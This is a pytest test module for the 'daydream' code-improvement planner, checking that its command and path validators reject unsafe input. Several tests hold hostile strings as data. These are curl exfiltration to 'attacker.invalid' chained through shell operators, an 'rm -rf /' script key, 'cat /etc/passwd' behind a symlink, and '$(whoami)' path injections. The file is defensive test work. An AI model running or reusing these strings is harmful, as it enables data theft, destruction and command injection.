import json
import os
import subprocess
import sys
from copy import deepcopy
from dataclasses import asdict
from datetime import date
from pathlib import Path
from typing import Any, cast

import pytest

from daydream import git_ops
from daydream.artifact_visibility import (
    ArtifactVisibilityError,
    operational_worktree_root,
    private_root_locations,
    resolve_private_workspace_owner,
)
from daydream.artifacts import ownership as artifact_ownership
from daydream.cli import main as cli_main
from daydream.improve.assemble import (
    AssemblyIssue,
    assemble_plan,
    render_issue,
)
from daydream.improve.command_contract import (
    validate_host_commands,
    validate_recon_commands,
)
from daydream.improve.plan_index import (
    PLAN_INDEX_FILENAME,
    PlanIndexEntry,
    _entry_fingerprints,
    _is_retryable,
    _merged_index,
    load_rejections,
    reanchored_plan_rows,
    record_rejections,
)
from daydream.improve.plans import (
    PlanWriteSession,
)
from daydream.improve.prioritize import aggregate_cross_service
from daydream.improve.prompts import (
    PLAN_AUTHOR_SCHEMA,
    build_plan_writer_repair_prompt,
)
from daydream.improve.reanchor import (
    PRUNE_GIT_FAILURE,
    PRUNE_NOT_FOUND,
    PRUNE_NOT_REANCHOR,
    PRUNE_REMOVED,
    PRUNE_UNSAFE_NAME,
    list_reanchor_worktrees,
    prune_named_reanchor_worktree,
    prune_stale_reanchor_worktrees,
)
from daydream.improve.render import plan_slug, render_plan
from daydream.improve.repo_commands import enumerate_repository_commands
from daydream.improve.reporting import (
    _reanchored_report_section,
)
from tests.harness.git_helpers import bare_remote as _bare_remote, commit, git, init_repo, write_and_stage
from tests.harness.improve_backend import plan_ref as _ref


def _repo(tmp_path: Path) -> tuple[Path, str]:
    repo = tmp_path / "repo"
    (repo / "apps/catalog").mkdir(parents=True)
    (repo / "tests").mkdir()
    (repo / "README.md").write_text("# Catalog service\n", encoding="utf-8")
    (repo / "Makefile").write_text(
        "test:\n\tuv run pytest\n",
        encoding="utf-8",
    )
    (repo / "apps/catalog/api.py").write_text(
        "def list_catalog():\n"
        "    return [load_item(item_id) for item_id in item_ids]\n",
        encoding="utf-8",
    )
    (repo / "tests/test_catalog.py").write_text(
        "def test_list_catalog_returns_items():\n"
        "    assert list_catalog()\n",
        encoding="utf-8",
    )
    init_repo(repo)
    git(repo, "add", ".")
    return repo, commit(repo, "initial")


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    """The single-commit catalog-service repo every plan test in this module plans against."""
    built, _ = _repo(tmp_path)
    return built


@pytest.fixture
def head_sha(repo: Path) -> str:
    """``repo``'s HEAD sha, the ``planned_at`` anchor for a plan authored against it."""
    return git(repo, "rev-parse", "HEAD")


@pytest.fixture
def private_locations(tmp_path: Path) -> Any:
    """Private artifact/operational roots isolated to this test's tmp path."""
    return private_root_locations(base=tmp_path / "private")


@pytest.fixture
def owner(repo: Path, private_locations: Any) -> Any:
    return resolve_private_workspace_owner(repo, locations=private_locations)


def _operational_root(repo: Path) -> Path:
    return operational_worktree_root(resolve_private_workspace_owner(repo, locations=private_root_locations()))


def _forbid_default_private_base(monkeypatch: pytest.MonkeyPatch, reason: str = "unexpected default lookup") -> None:
    """A supplied owner (or a rejected input) must never reach default storage."""
    monkeypatch.setattr(
        artifact_ownership, "_default_private_base", lambda: (_ for _ in ()).throw(AssertionError(reason)),
    )


def _finding(*, fingerprint: str = "fp-fix-n-plus-one") -> dict[str, object]:
    return {"fingerprint": fingerprint, "title": "Fix N+1 catalog queries", "category": "performance",
        "path": "apps/catalog/api.py", "body": "The endpoint issues one query per catalog item.", "impact": "HIGH",
        "effort": "M", "risk": "MED", "confidence": "HIGH", "evidence": ["apps/catalog/api.py:1"],
        "maintenance_signals": [], "change_shape": "unknown", "reuse_target": None,
    }


def _recon_commands() -> list[dict[str, Any]]:
    return [{"id": "test-suite", "purpose": "Run the repository Python test suite", "command": "uv run pytest",
            "working_directory": ".",
            "expected_success": {"exit_code": 0, "observable_result": "exit 0 and the selected pytest tests pass",},
            "applicability": {"scope": {"kind": "whole-repository"}, "preconditions": [],
                "rationale": "The Makefile declares this repository-wide test entry point.",
            },
            "evidence": {
                "kind": "literal-command", "source_path": "Makefile", "line_anchor": {"start_line": 2, "end_line": 2},
                "verbatim_excerpt": "\tuv run pytest",
            },
        },
        {"id": "git-diff", "purpose": "Check that unrelated paths remain unchanged",
            "command": "git diff --exit-code", "working_directory": ".",
            "expected_success": {"exit_code": 0, "observable_result": "exit 0 and no unexpected diff is reported",},
            "applicability": {"scope": {"kind": "whole-repository"}, "preconditions": [],
                "rationale": "Git repository metadata establishes the diff command.",
            },
            "evidence": {
                "kind": "literal-command", "source_path": "README.md", "line_anchor": {"start_line": 1, "end_line": 1},
                "verbatim_excerpt": "# Catalog service",
            },
        },
    ]


def _contract_applicability(*paths: str, preconditions: list[str] | None = None,) -> dict[str, Any]:
    scope: dict[str, Any]
    if paths:
        scope = {"kind": "in-scope-paths", "paths": list(paths)}
    else:
        scope = {"kind": "whole-repository"}
    return {"scope": scope, "preconditions": preconditions or [],
        "rationale": "This command is applicable to the declared repository scope.",
    }


def test_host_command_population_keeps_per_package_invocations_ids_and_confinement(tmp_path: Path) -> None:
    repo, outside = tmp_path / "repo", tmp_path / "outside"
    repo.mkdir()
    outside.mkdir()
    outside_bytes = b"outside-test:\n\tcat /etc/passwd\n"
    (outside / "Makefile").write_bytes(outside_bytes)
    (repo / "linked").symlink_to(outside, target_is_directory=True)
    (repo / "Makefile").write_text(
        "test:\n\tpytest\ninstall:\n\tpip install -r requirements.txt\n"
        "install-hooks:\n\tpre-commit install\ngenerate-report:\n\ttool report\n", encoding="utf-8",
    )
    (repo / "package.json").write_text(json.dumps({"scripts": {
        "ci && rm -rf /": "true", "test": "vitest run", "install": "npm install",
        "prepare": "husky install", "generate:report": "tool report",
    }}, indent=2), encoding="utf-8")
    for directory, lock in (("yarn", "yarn.lock"), ("bun", "bun.lockb"), ("npm", "package-lock.json")):
        package = repo / directory
        package.mkdir()
        (package / "package.json").write_text('{"scripts": {"test": "vitest run"}}\n', encoding="utf-8")
        (package / lock).write_text("{}\n", encoding="utf-8")
    (repo / "broken").mkdir()
    (repo / "broken/package.json").write_text("{not json", encoding="utf-8")

    candidates = enumerate_repository_commands(repo,
        directories=(".", "yarn", "bun", "npm", "broken", "linked", "../outside"), reserved_ids=["make-test"],
    )
    assert [(item["working_directory"], item["id"], item["command"]) for item in candidates] == [
        (".", "make-test-2", "make test"), (".", "npm-ci-rm-rf", "npm run ci && rm -rf /"),
        (".", "npm-test", "npm run test"), ("yarn", "yarn-test", "yarn test"),
        ("bun", "bun-test", "bun run test"), ("npm", "npm-test-2", "npm run test"),
    ]
    accepted, errors = validate_host_commands(candidates, repo=repo)
    assert [(item["working_directory"], item["id"], item["command"]) for item in accepted] == [
        (".", "make-test-2", "make test"), (".", "npm-test", "npm run test"),
        ("yarn", "yarn-test", "yarn test"), ("bun", "bun-test", "bun run test"),
        ("npm", "npm-test-2", "npm run test"),
    ]
    assert errors == ["RECON_MALFORMED_COMMAND@/host_commands/1/command"]
    assert {item["evidence"]["kind"] for item in accepted} == {"host-derived"}
    assert (outside / "Makefile").read_bytes() == outside_bytes


def _criterion(kind: str, description: str, verification: Any = None) -> dict[str, Any]:
    return {"kind": kind, "description": description, "verification": verification}


def _authored_plan(*, title: str = "Batch catalog queries") -> dict[str, Any]:
    focused = "tests/test_catalog.py -q"
    return {"title": title, "covered_fingerprints": ["fp-fix-n-plus-one"],
        "why_this_matters": {"problem": "list_catalog currently loads each catalog item separately.",
            "concrete_cost": "Large catalogs create avoidable query latency per request.",
            "intended_outcome": "list_catalog batches item loading while preserving results.",
        },
        "scope": {"existing_paths": [{"path": "apps/catalog/api.py", "role": "Implement batched catalog loading.",},
                {"path": "tests/test_catalog.py", "role": "Add catalog query regression coverage.",},
            ], "new_paths": [],
            "out_of_scope_paths": [
                {"path": "README.md", "reason": "Catalog batching does not change user documentation.",}
            ],
            "out_of_scope_behaviors": [{"behavior": "The public catalog response shape remains unchanged.",
                    "reason": "Existing API consumers depend on the current response.",
                }
            ],
        },
        "context_excerpts": [{"path": "apps/catalog/api.py", "start_line": 1, "end_line": 2,
                "file_role": "Implement batched catalog loading.",
            },
            {"path": "tests/test_catalog.py", "start_line": 1, "end_line": 2,
                "file_role": "Add catalog query regression coverage.",
            },
        ],
        "git_workflow": {"commit_boundaries": "Commit the behavior and its tests as one logical unit.",
            "commit_message_example": "perf: batch catalog item loading",
        },
        "steps": [{"title": "Batch item loading in list_catalog",
                "changes": [_change('apps/catalog/api.py', 'list_catalog', 'modify',
                        'Replace per-item load_item calls with one batched lookup.',
                        'list_catalog performs one batch lookup and preserves order.'
                    ),
                    _change('tests/test_catalog.py', 'test_list_catalog_batches_item_loading', 'modify',
                        'Add a regression that counts the catalog loader calls.',
                        'test_list_catalog_batches_item_loading proves one batch call.'
                    ),
                ], "verification": _ref(appended_args=focused, note="Runs the focused catalog regression suite.",),
            },
        ],
        "test_plan": {"mode": "new-or-updated-tests",
            "rationale": ("Catalog batching changes runtime behavior and needs a focused regression."),
            "existing_coverage": [],
            "exemplars": [{"path": "tests/test_catalog.py", "symbol": "test_list_catalog_returns_items",
                    "pattern_to_copy": "Use the existing direct function-call assertion style.",
                }
            ],
            "cases": [{"name": "Catalog loading uses one batch query", "test_file": "tests/test_catalog.py",
                    "test_symbol": "test_list_catalog_batches_item_loading", "kind": "unit",
                    "setup": "Provide three item identifiers and a recording batch loader.",
                    "action": "Call list_catalog once with the three catalog identifiers.",
                    "assertions": ["The loader receives all three identifiers in one call.",
                        "The returned catalog item order remains unchanged.",
                    ], "verification": _ref(appended_args=focused),
                }
            ],
        },
        "done_criteria": [_criterion(
                "behavior", "list_catalog performs one batch load for multiple items.", _ref(appended_args=focused),
            ),
        ],
        "false_assumption": {"condition": "The load_item interface cannot accept multiple catalog identifiers.",
            "evidence_to_report": "Report the load_item signature and its only supported input.",
            "related_paths": ["apps/catalog/api.py"], "related_step_numbers": [1],
        }, "additional_command_refs": [],
    }


def _authored_new_file_plan() -> dict[str, Any]:
    plan = _authored_plan(title="Add catalog batching regression")
    new_test = "tests/test_catalog_batching.py"
    plan["scope"]["new_paths"] = [{"path": new_test, "role": "Add focused catalog query batching regression coverage.",}
    ]
    test_change = plan["steps"][0]["changes"][1]
    test_change.update(path=new_test, operation="create")
    plan["test_plan"]["cases"][0]["test_file"] = new_test
    return plan


def _declare_makefile_out_of_scope(plan: dict[str, Any]) -> None:
    plan["scope"]["out_of_scope_paths"].append(
        {"path": "Makefile", "reason": "The catalog change adds no new build or test entry point.",}
    )


def _change(path: str, symbol: str, operation: str, instruction: str, target_state: str,) -> dict[str, Any]:
    return {"path": path, "symbol": symbol, "operation": operation, "instruction": instruction,
        "target_state": target_state,
    }


def _add_readme_change(plan: dict[str, Any]) -> None:
    plan["steps"][0]["changes"].append(_change(
            'README.md', 'Catalog service', 'modify', 'Document that catalog item loading is now batched.',
            'README.md states catalog loading issues one query.'
        )
    )


def _assembled(repo: Path, plan: dict[str, Any] | None = None, *, commands: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    assembled, issues = assemble_plan(
        plan or _authored_plan(), repo=repo, recon_commands=commands if commands is not None else _recon_commands(),
    )
    assert issues == ()
    assert assembled is not None
    return assembled


def _render_assembled_plan(assembled: dict[str, Any], head_sha: str) -> str:
    return render_plan(_finding(), plan=assembled, planned_at=head_sha, planned_on=date(2024, 1, 1), number=1,)


def _selection(repo: Path, *, plan: dict[str, Any] | None = None, fingerprint: str = "fp-fix-n-plus-one",
) -> dict[str, Any]:
    """Model one landed plan-writer result: real assembler output plus finding."""
    return {"finding": _finding(fingerprint=fingerprint), **_assembled(repo, plan)}


def _issues(repo: Path, plan: dict[str, Any], *, commands: list[dict[str, Any]] | None = None,
) -> tuple[AssemblyIssue, ...]:
    assembled, issues = assemble_plan(
        plan, repo=repo, recon_commands=commands if commands is not None else _recon_commands(),
    )
    assert assembled is None
    assert issues
    return issues


def _authoring_failure_selection(issues: tuple[AssemblyIssue, ...], *, fingerprint: str = "fp-fix-n-plus-one",
) -> dict[str, Any]:
    """Model the orchestrator's second-attempt authoring-failure selection."""
    return {"finding": _finding(fingerprint=fingerprint),
        "_attempt": {
            "received_result": None, "errors": tuple(render_issue(issue) for issue in issues), "validation": True,
        }, "error": True,
    }


def _write_plans(
    plans_dir: Path, selections: list[dict[str, Any]], *, planned_at: str, non_interactive_default: bool = False,
    run_session_id: str | None = None, completion_order: list[int] | None = None,
) -> dict[str, list[dict[str, Any]]]:
    """Reserve in selection order, then land each result in the requested completion order."""
    session = PlanWriteSession(plans_dir, planned_at=planned_at, non_interactive_default=non_interactive_default,
        run_session_id=run_session_id,
    )
    reservations = session.reserve([selection.get("finding") for selection in selections])
    order = (completion_order if completion_order is not None else list(range(len(selections))))
    assert sorted(order) == list(range(len(selections)))
    for index in order:
        session.commit(reservations[index], selections[index])
    return session.finish()


def _advance_head(repo: Path, text: str = "# Catalog service\n\nConcurrent branch update.\n") -> str:
    write_and_stage(repo, "README.md", text)
    return commit(repo, "advance head after plan fan-out")


def _read_sidecar(root: Path) -> dict[str, Any]:
    return cast(dict[str, Any], json.loads((root / PLAN_INDEX_FILENAME).read_text(encoding="utf-8")))


def _planned_fingerprints(plans_dir: Path) -> set[str]:
    """Package identities and aliases with durable plan status (test-side view)."""
    entries = _merged_index(plans_dir).values()
    return {fp for e in entries if not _is_retryable(plans_dir, e) for fp in _entry_fingerprints(e)}


def _write_single_plan(repo: Path, assembled: dict[str, Any], planned_at: str,) -> dict[str, list[dict[str, Any]]]:
    """Write one assembled plan for ``repo`` through the production API."""
    return _write_plans(repo / "daydream_plans", [{"finding": _finding(), **assembled}], planned_at=planned_at,)


MALFORMED_FIRST_RUN_COMMANDS = (
    "make test -> uv run pytest -n auto", "pre-push hook (...): uv lock --check && ...", "CI checks: uv run pytest -q",
    "Continuous integration => npm test", "uv run pytest -q (focused suite)", "Run this command: uv run pytest -q",
)


def test_recon_batch_keeps_literal_commands_and_locates_unsafe_siblings(repo: Path, tmp_path: Path) -> None:
    valid = ["go build ./...", "rg 'foo(bar)' src", 'grep -E "foo\\(bar\\)" src/app.py']
    unsafe = [
        *MALFORMED_FIRST_RUN_COMMANDS,
        "pytest ...",
        "pytest tests (focused suite)",
        "pytest tests && rm -rf build",
        "uv run pytest && uv run ruff check .",
        "uv run pytest `printf tests/test_catalog.py`",
        "uv run pytest $(printf tests/test_catalog.py)",
        "uv run pytest <(printf tests/test_catalog.py)",
    ]
    literals = valid + unsafe
    (repo / "Makefile").write_text("\n".join(literals) + "\n", encoding="utf-8")
    template = _recon_commands()[0]
    records = [
        {
            **template,
            "id": f"command-{index}",
            "command": literal,
            "evidence": {
                "kind": "literal-command",
                "source_path": "Makefile",
                "line_anchor": {"start_line": index + 1, "end_line": index + 1},
                "verbatim_excerpt": literal,
            },
        }
        for index, literal in enumerate(literals)
    ]
    outside = tmp_path / "outside"
    outside.mkdir()
    records.extend([
        {**records[0], "id": "invalid-anchor", "evidence": {**records[0]["evidence"],
            "line_anchor": {**records[0]["evidence"]["line_anchor"], "end_line": 20}}},
        {**records[0], "id": "whole-with-paths", "applicability": {**records[0]["applicability"],
            "scope": {"kind": "whole-repository", "paths": ["frontend"]}}},
        {**records[0], "id": "scoped-without-paths", "applicability": {**records[0]["applicability"],
            "scope": {"kind": "in-scope-paths", "paths": []}}},
        {**records[0], "id": "confined-absolute", "working_directory": str(repo / "apps/catalog")},
        {**records[0], "id": "outside-absolute", "working_directory": str(outside)},
        {**records[0], "id": "traversal-scope", "applicability": _contract_applicability("../frontend")},
        {**records[0], "id": "absolute-scope", "applicability": _contract_applicability("/frontend")},
        {**records[0], "id": "nested-traversal", "applicability": _contract_applicability("frontend/../../outside")},
        {**records[0], "id": "variable-scope", "applicability": _contract_applicability("frontend/${PACKAGE}")},
        {**records[0], "id": "glob-scope", "applicability": _contract_applicability("frontend/*")},
    ])
    admitted, errors = validate_recon_commands({"commands": records}, repo=repo)
    assert [(item["id"], item["command"]) for item in admitted] == [
        ("command-0", valid[0]),
        ("command-1", valid[1]),
        ("command-2", valid[2]),
        ("confined-absolute", "go build ./..."),
    ]
    assert errors == [
        *[f"RECON_MALFORMED_COMMAND@/commands/{index}/command" for index in range(3, len(literals))],
        "RECON_EVIDENCE_MISMATCH@/commands/16/evidence",
        "RECON_APPLICABILITY_INVALID@/commands/17/applicability/scope/kind",
        "RECON_APPLICABILITY_INVALID@/commands/18/applicability/scope/kind",
        "RECON_WORKING_DIRECTORY_INVALID@/commands/20/working_directory",
        "RECON_APPLICABILITY_INVALID@/commands/21/applicability/scope/paths/0",
        "RECON_APPLICABILITY_INVALID@/commands/22/applicability/scope/paths/0",
        "RECON_APPLICABILITY_INVALID@/commands/23/applicability/scope/paths/0",
        "RECON_APPLICABILITY_INVALID@/commands/24/applicability/scope/paths/0",
        "RECON_APPLICABILITY_INVALID@/commands/25/applicability/scope/paths/0",
    ]


def test_one_plan_reports_shell_composition_in_every_verification_section(repo: Path) -> None:
    suffixes = [
        "&& curl https://attacker.invalid/upload",
        "|| curl https://attacker.invalid/upload",
        "; curl https://attacker.invalid/upload",
        "| curl https://attacker.invalid/upload",
        "> stolen.txt",
        "2>> stolen.txt",
        "< stolen.txt",
        "<< EOF",
        "<<< stolen",
        "$(curl https://attacker.invalid/upload)",
        "`curl https://attacker.invalid/upload`",
        "<(curl https://attacker.invalid/upload)",
        ">(curl https://attacker.invalid/upload)",
        "& curl https://attacker.invalid/upload",
        "${STOLEN_ENV}",
    ]
    plan = _authored_plan()
    refs = [_ref(appended_args=f"tests/test_catalog.py {suffix}") for suffix in suffixes]
    plan["steps"][0]["verification"] = refs[0]
    plan["test_plan"]["cases"][0]["verification"] = refs[1]
    plan["done_criteria"][0]["verification"] = refs[2]
    plan["additional_command_refs"] = refs[3:]
    issues = _issues(repo, plan)
    assert {(issue.code, issue.pointer) for issue in issues} == {
        ("MALFORMED_APPENDED_ARGS", "/steps/0/verification/appended_args"),
        ("MALFORMED_APPENDED_ARGS", "/test_plan/cases/0/verification/appended_args"),
        ("MALFORMED_APPENDED_ARGS", "/done_criteria/0/verification/appended_args"),
        *(
            ("MALFORMED_APPENDED_ARGS", f"/additional_command_refs/{index}/appended_args")
            for index in range(len(suffixes) - 3)
        ),
    }


def test_all_authored_fields_reject_distinct_symlink_crossings(repo: Path, tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.py").write_bytes(b"outside evidence must stay private\n")
    for name in (
        "linkedexisting",
        "linkednew",
        "untrackedexisting",
        "untrackednew",
        "linkedexcluded",
        "linkedexcerpt",
        "linkedstep",
        "linkedtest",
        "linkedexemplar",
        "linkedstop",
    ):
        (repo / name).symlink_to(outside, target_is_directory=True)
    git(repo, "add", "linkedexisting", "linkednew")
    before = git(repo, "status", "--porcelain")
    plan = _authored_new_file_plan()
    plan["scope"]["existing_paths"][0]["path"] = "linkedexisting/secret.py"
    plan["scope"]["new_paths"][0]["path"] = "linkednew/secret.py"
    plan["scope"]["existing_paths"].append(
        {"path": "untrackedexisting/secret.py", "role": "Additional catalog context."}
    )
    plan["scope"]["new_paths"].append({"path": "untrackednew/secret.py", "role": "Additional catalog regression."})
    plan["scope"]["out_of_scope_paths"][0]["path"] = "linkedexcluded/secret.py"
    plan["context_excerpts"].append(
        {
            "path": "linkedexcerpt/secret.py",
            "start_line": 1,
            "end_line": 1,
            "file_role": "Context for the planned catalog change.",
        }
    )
    plan["steps"][0]["changes"][0]["path"] = "linkedstep/secret.py"
    plan["test_plan"]["cases"][0]["test_file"] = "linkedtest/secret.py"
    plan["test_plan"]["exemplars"][0]["path"] = "linkedexemplar/secret.py"
    plan["false_assumption"]["related_paths"][0] = "linkedstop/secret.py"
    original_scope = deepcopy(plan["scope"])
    issues = _issues(repo, plan)
    assert {issue.pointer for issue in issues if issue.code == "PATH_OUTSIDE_REPOSITORY"} == {
        "/scope/existing_paths/0/path",
        "/scope/new_paths/0/path",
        "/scope/out_of_scope_paths/0/path",
        "/scope/existing_paths/2/path",
        "/scope/new_paths/1/path",
        "/context_excerpts/2/path",
        "/steps/0/changes/0/path",
        "/test_plan/cases/0/test_file",
        "/test_plan/exemplars/0/path",
        "/false_assumption/related_paths/0",
    }
    assert plan["scope"] == original_scope
    assert (outside / "secret.py").read_bytes() == b"outside evidence must stay private\n"
    assert git(repo, "status", "--porcelain") == before


def test_one_plan_locates_unsafe_path_grammar_and_never_publishes_it(repo: Path, head_sha: str) -> None:
    path = "routes/user.$username.tsx"
    (repo / "routes").mkdir()
    (repo / path).write_text("export default function User() {}\n", encoding="utf-8")
    git(repo, "add", path)
    plan = _authored_new_file_plan()
    plan["scope"]["existing_paths"][0]["path"] = "../catalog.py"
    plan["scope"]["new_paths"][0]["path"] = "/tmp/catalog.py"
    plan["scope"]["out_of_scope_paths"][0]["path"] = "docs/catalog`draft.md"
    plan["context_excerpts"].append(
        {
            "path": "docs/catalog$draft.md",
            "start_line": 1,
            "end_line": 1,
            "file_role": "Context for the planned catalog change.",
        }
    )
    plan["steps"][0]["changes"][0]["path"] = path
    plan["test_plan"]["cases"][0]["test_file"] = "docs/catalog|tee.md"
    plan["test_plan"]["exemplars"][0]["path"] = "src/$(whoami).py"
    plan["steps"][0]["changes"].append({**plan["steps"][0]["changes"][0], "path": "../outside/pwn.py"})
    plan["false_assumption"]["related_paths"] = ["../outside.py", "src/$(whoami).py"]
    original_scope = deepcopy(plan["scope"])
    issues = _issues(repo, plan)
    unsafe_pointers = {
        "/scope/existing_paths/0/path",
        "/scope/new_paths/0/path",
        "/scope/out_of_scope_paths/0/path",
        "/context_excerpts/2/path",
        "/steps/0/changes/0/path",
        "/test_plan/cases/0/test_file",
        "/test_plan/exemplars/0/path",
        "/false_assumption/related_paths/0",
        "/false_assumption/related_paths/1",
        "/steps/0/changes/2/path",
    }
    assert {issue.pointer for issue in issues if issue.code == "AUTHOR_SCHEMA_INVALID"} == unsafe_pointers
    assert {issue.pointer for issue in issues if issue.code == "MALFORMED_PATH"} == unsafe_pointers
    assert plan["scope"] == original_scope
    result = _write_plans(repo / "daydream_plans", [_authoring_failure_selection(issues)], planned_at=head_sha,)
    assert result["written"] == []
    assert "AUTHOR_SCHEMA_INVALID" in (repo / "daydream_plans/README.md").read_text()


def _plan_selection(repo: Path, title: str) -> dict[str, Any]:
    """One landed plan-writer result with its own fingerprint and slug."""
    return {"finding": _finding(fingerprint=f"fp-{plan_slug(title)}"), **_assembled(repo, _authored_plan(title=title)),}




def test_planned_at_from_an_unrelated_root_is_rejected(repo: Path, head_sha: str) -> None:
    assembled = _assembled(repo)
    tree = git(repo, "rev-parse", "HEAD^{tree}")
    unrelated_root = git(repo, "commit-tree", tree, "-m", "unrelated root with the same tree",)
    git(repo, "checkout", "--detach", unrelated_root)
    result = _write_single_plan(repo, assembled, head_sha)
    assert result["written"] == []
    assert "PLANNED_AT_NOT_ANCESTOR" in (repo / "daydream_plans/README.md").read_text()


def test_planned_at_naming_only_remote_branch_is_invalid(repo: Path, tmp_path: Path) -> None:
    bare = _bare_remote(tmp_path / "remote.git")
    git(repo, "remote", "add", "origin", str(bare))
    git(repo, "push", "-u", "origin", "main")
    git(repo, "checkout", "-b", "only-remote")
    (repo / "notes.txt").write_text("only-remote\n")
    git(repo, "add", "notes.txt")
    commit(repo, "only-remote commit")
    git(repo, "push", "-u", "origin", "only-remote")
    git(repo, "checkout", "main")
    git(repo, "branch", "-D", "only-remote")

    result = _write_single_plan(repo, _assembled(repo), "only-remote")

    assert result["written"] == []
    assert "PLANNED_AT_INVALID" in (repo / "daydream_plans/README.md").read_text()


@pytest.mark.parametrize("probe_argv",
    [pytest.param(lambda sha: ["git", "rev-parse", "--verify", f"{sha}^{{commit}}"], id="commit-existence",),
        pytest.param(lambda sha: ["git", "merge-base", "--is-ancestor", sha, "HEAD"], id="ancestry",),
    ],
)
def test_plan_anchor_git_timeout_blocks_plan(
    repo: Path, head_sha: str, monkeypatch: pytest.MonkeyPatch, probe_argv: Any,
) -> None:
    selection = _selection(repo)
    timed_out = probe_argv(head_sha)
    saved_run = subprocess.run

    def stall_probe(*args: Any, **kwargs: Any) -> subprocess.CompletedProcess[Any]:
        if args[0] == timed_out:
            raise subprocess.TimeoutExpired(cmd=timed_out, timeout=5)
        return saved_run(*args, **kwargs)

    monkeypatch.setattr("daydream.git_ops.process.subprocess.run", stall_probe)

    result = _write_plans(repo / "daydream_plans", [selection], planned_at=head_sha)

    assert result["written"] == []
    assert len(result["failed"]) == 1
    assert not list((repo / "daydream_plans").glob("[0-9][0-9][0-9]-*.md"))
    assert "BLOCKED (PLAN_VALIDATION_FAILED: PLANNED_AT_CHECK_FAILED)" in (repo / "daydream_plans/README.md"
    ).read_text()
    assert len(result["diagnostics"]) == 1
    diagnostic = result["diagnostics"][0]
    assert diagnostic["stage"] == "semantic"
    assert diagnostic["disposition"] == "blocked"
    assert diagnostic["errors"] == [{"code": "PLANNED_AT_CHECK_FAILED", "pointer": "/"}]
    sidecar = _read_sidecar(repo / "daydream_plans")
    assert [entry["host_blocked"] for entry in sidecar["plans"]] == [True]


def test_plan_write_session_rejects_wrong_owner_before_mutation(tmp_path: Path,) -> None:
    repo, head_sha = _repo(tmp_path / "target")
    other, _ = _repo(tmp_path / "other")
    owner = resolve_private_workspace_owner(other, locations=private_root_locations(base=tmp_path / "private"),)
    plans_dir = repo / "daydream_plans"
    with pytest.raises(ArtifactVisibilityError, match="Git identity"):
        PlanWriteSession(plans_dir, planned_at=head_sha, private_workspace_owner=owner)
    assert not plans_dir.exists()


def test_concurrent_runs_prune_does_not_destroy_live_reanchored_plan(
    repo: Path, head_sha: str, owner: Any, private_locations: Any,
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setattr(sys, "argv", ["daydream", "improve", "list-reanchored", str(repo)])
    with pytest.raises(SystemExit) as empty:
        cli_main()
    assert empty.value.code == 0 and "No re-anchored plans" in capsys.readouterr().out
    new_head = _advance_head(repo)
    _forbid_default_private_base(monkeypatch)
    operational = operational_worktree_root(owner)
    selections = [_selection(repo),
        _selection(repo, fingerprint="fp-observability", plan=_authored_plan(title="Catalog observability"))]
    session = PlanWriteSession(repo / "daydream_plans", planned_at=head_sha, run_session_id="run-A",
        private_workspace_owner=owner)
    reservations = session.reserve([selection["finding"] for selection in selections])
    first = session.commit(reservations[0], selections[0])
    second = session.commit(reservations[1], selections[1])
    worktree = operational / "run-A-reanchor"
    assert first.status == second.status == "written"
    assert Path(first.path or "") == worktree / "daydream_plans/001-batch-catalog-queries.md"
    assert Path(second.path or "") == worktree / "daydream_plans/002-catalog-observability.md"
    assert not worktree.is_relative_to(repo) and not worktree.is_relative_to(owner.artifact_state_root)
    assert {path.name for path in private_locations.operational_workspaces.iterdir()} == {owner.workspace_key}
    assert git_ops.worktree_lock_mtime(worktree) is not None
    plans_dir = repo / "daydream_plans"
    main_bytes = {path.name: path.read_bytes() for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")}
    assert set(main_bytes) == {"001-batch-catalog-queries.md", "002-catalog-observability.md"}
    assert {path.name: path.read_bytes()
        for path in (worktree / "daydream_plans").glob("[0-9][0-9][0-9]-*.md")} == main_bytes
    assert f"**Planned at**: commit `{new_head[:7]}`" in main_bytes["001-batch-catalog-queries.md"].decode()
    assert f"`{new_head}`" in main_bytes["001-batch-catalog-queries.md"].decode()
    assert [(entry["number"], entry["slug"], entry["planned_at"], entry["status"])
        for entry in _read_sidecar(worktree / "daydream_plans")["plans"]] == [
        (1, "batch-catalog-queries", new_head, "TODO"), (2, "catalog-observability", new_head, "TODO"),
    ]
    expected_rows = [
        (1, "REANCHORED (landed at daydream_plans/001-batch-catalog-queries.md)"),
        (2, "REANCHORED (landed at daydream_plans/002-catalog-observability.md)"),
    ]
    assert [(entry["number"], entry["status"]) for entry in _read_sidecar(plans_dir)["plans"]] == expected_rows
    assert _planned_fingerprints(plans_dir) == {"fp-fix-n-plus-one", "fp-observability"}
    main_index = (plans_dir / "README.md").read_text()
    assert "[001](001-batch-catalog-queries.md)" in main_index and "[002](002-catalog-observability.md)" in main_index

    named, stale, ordinary = operational / "run-B-reanchor", operational / "run-C-reanchor", operational / "feature"
    for sibling in (named, stale, ordinary):
        git(repo, "worktree", "add", "--detach", str(sibling), "HEAD")
    (named / "daydream_plans").mkdir()
    (named / "daydream_plans/001-x.md").write_text("# first\n")
    (named / "daydream_plans/002-y.md").write_text("# second\n")
    (stale / "marker.txt").write_text("leftover\n")
    assert list_reanchor_worktrees(repo, private_workspace_owner=owner) == [worktree, named, stale]
    outcome = prune_named_reanchor_worktree(repo, named.name, private_workspace_owner=owner)
    assert outcome.verdict == PRUNE_REMOVED and outcome.plan_count == 2 and not named.exists()
    assert prune_stale_reanchor_worktrees(repo, private_workspace_owner=owner) == 1
    assert not stale.exists() and worktree.is_dir() and ordinary.is_dir()
    assert git_ops.worktree_lock_mtime(worktree) is not None
    assert list_reanchor_worktrees(repo, private_workspace_owner=owner) == [worktree]

    monkeypatch.setattr(sys, "argv", ["daydream", "improve", "list-reanchored", str(repo)])
    with pytest.raises(SystemExit) as text_listing:
        cli_main()
    assert text_listing.value.code == 0
    listing = capsys.readouterr().out
    assert "001" in listing and "Batch catalog queries" in listing
    assert "002" in listing and "Catalog observability" in listing
    assert "daydream_plans/001-batch-catalog-queries.md" in listing
    assert "daydream_plans/002-catalog-observability.md" in listing
    monkeypatch.setattr(sys, "argv", ["daydream", "improve", "list-reanchored", "--json", str(repo)])
    with pytest.raises(SystemExit) as json_listing:
        cli_main()
    assert json_listing.value.code == 0
    assert json.loads(capsys.readouterr().out) == [
        {"number": 1, "title": "Batch catalog queries", "status": expected_rows[0][1],
